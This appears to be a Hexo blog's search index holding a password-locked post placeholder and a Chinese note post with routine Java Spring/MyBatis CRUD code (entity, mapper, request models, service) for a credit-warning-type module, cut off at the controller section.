<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>新建文章测试</title>
      <link href="/2023/03/31/xin-jian-wen-zhang-ce-shi/"/>
      <url>/2023/03/31/xin-jian-wen-zhang-ce-shi/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2576c733315450e7a5fed56a85a6c5458b76a210c3cbe2dcd78af17a1354a623">1b693c4938223286468132b2f7068bf6843f685a75b91ea775f5232a308829197cfd2fc27d571530824570c25ceebae5fa79858974b6d4c869571b915937a3ecd0089eafbabdef06dc134761249bbf5e3d2c6ae8fe5e0112224e27720d63e4c39cb4eaca1b01929b186863cafb44f2b0e0195f39a2e6c6966bfd035ec5dcbeb0d5a603bbc5ac9486be390b07de87aaaae961e2f5461b780916872fb28d438f41</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码笔记</title>
      <link href="/2023/03/30/java-dai-ma-bi-ji/"/>
      <url>/2023/03/30/java-dai-ma-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="常规CRUD"><a href="#常规CRUD" class="headerlink" title="常规CRUD"></a>常规CRUD</h1><h2 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Table: T_XYYJ_YJLX</span></span><br><span class="line"><span class="comment"> * TableName: 信用预警——预警类型信息表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ApiModel(value=&quot;信用预警——预警类型信息表&quot;)</span></span><br><span class="line"><span class="meta">@Table(name = &quot;T_XYYJ_YJLX&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningType</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型主键</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_ID&quot;)</span></span><br><span class="line">    <span class="meta">@GeneratedValue(generator = &quot;JDBC&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型主键&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer warningTypeId;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型编码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_BM&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型编码&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeCode;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_MC&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeName;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型说明</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_SM&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型说明&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeContext;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Create_Time&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;创建时间&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建用户编号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Create_User_Id&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;创建用户编号&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer createUserId;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建用户名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Create_User_Name&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;创建用户名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String createUserName;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Update_Time&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;更新时间&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新用户编号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Update_User_Id&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;更新用户编号&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer updateUserId;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新用户名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;YJLX_Update_User_Name&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;更新用户名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String updateUserName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mapper类"><a href="#Mapper类" class="headerlink" title="Mapper类"></a>Mapper类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.mapper;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningType;</span><br><span class="line"><span class="keyword">import</span> tk.mybatis.mapper.common.Mapper;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">WarningTypeMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">WarningType</span>&gt; </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Model类"><a href="#Model类" class="headerlink" title="Model类"></a>Model类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.model;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.NotBlank;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年1月19日, 0019</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;新增预警类型请求类&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningTypeAddBody</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">7931205996167983238L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型编码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型编码&quot;)</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;预警类型编码不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeCode;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型名称&quot;)</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;预警类型名称不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypName;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型说明</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型说明&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.model;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.framework.boot.model.BaseRequest;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年1月19日, 0019</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;模糊查询预警类型请求类&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningTypeFindByKey</span> <span class="keyword">extends</span> <span class="title">BaseRequest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3343948693858710848L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型编码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型编码&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeCode;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeName;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型说明</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型说明&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.model;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.NotBlank;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年1月19日, 0019</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;预警类型修改请求类&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningTypeUpdBody</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7212177218485625148L</span>;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型主键&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer warningTypeId;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型编码&quot;)</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;预警类型编码不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeCode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型名称&quot;)</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;预警类型名称不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预警类型说明</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;预警类型说明&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String warningTypeContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Service类"><a href="#Service类" class="headerlink" title="Service类"></a>Service类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.service;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.dynamic.datasource.annotation.DS;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageHelper;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningType;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.mapper.WarningTypeMapper;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.WarningTypeFindByKey;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> tk.mybatis.mapper.entity.Example;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预警类型管理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年1月19日, 0019</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@DS(&quot;XYYJ&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningTypeService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningTypeMapper warningTypeMapper;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warningType:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addWarningType</span><span class="params">(WarningType warningType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> warningTypeMapper.insertSelective(warningType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delWarningType</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> warningTypeMapper.deleteByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修改预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warningType:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateWarningType</span><span class="params">(WarningType warningType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> warningTypeMapper.updateByPrimaryKeySelective(warningType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Optional&lt;WarningType&gt; <span class="title">findWarningTypeById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        WarningType warningType = warningTypeMapper.selectByPrimaryKey(id);</span><br><span class="line">        <span class="keyword">return</span> Optional.ofNullable(warningType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> :</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PageInfo&lt;WarningType&gt; <span class="title">getWarningTypeList</span><span class="params">(WarningTypeFindByKey req)</span> </span>&#123;</span><br><span class="line">        Example example = <span class="keyword">new</span> Example(WarningType.class);</span><br><span class="line">        Example.Criteria criteria = example.createCriteria();</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(req.getWarningTypeCode()))&#123;</span><br><span class="line">            criteria.andLike(<span class="string">&quot;warningTypeCode&quot;</span>, <span class="string">&quot;%&quot;</span>+req.getWarningTypeCode()+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(req.getWarningTypeName())) &#123;</span><br><span class="line">            criteria.andLike(<span class="string">&quot;warningTypeName&quot;</span>, <span class="string">&quot;%&quot;</span>+req.getWarningTypeName()+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(req.getOrderField())) &#123;</span><br><span class="line">            <span class="comment">//用户自定义排序</span></span><br><span class="line">            Example.OrderBy orderBy = example.orderBy(req.getOrderField());</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotBlank(req.getOrderSort())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;asc&quot;</span>.equals(req.getOrderSort())) &#123;</span><br><span class="line">                    orderBy.asc();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    orderBy.desc();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//设置默认排序</span></span><br><span class="line">            example.orderBy(<span class="string">&quot;warningTypeId&quot;</span>).desc();</span><br><span class="line">        &#125;</span><br><span class="line">        PageHelper.startPage(req.getPageNo(), req.getPageSize());</span><br><span class="line">        List&lt;WarningType&gt; dataList = warningTypeMapper.selectByExample(example);</span><br><span class="line">        PageInfo&lt;WarningType&gt; pageInfo = <span class="keyword">new</span> PageInfo&lt;&gt;(dataList);</span><br><span class="line">        <span class="keyword">return</span> pageInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Controller类"><a href="#Controller类" class="headerlink" title="Controller类"></a>Controller类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 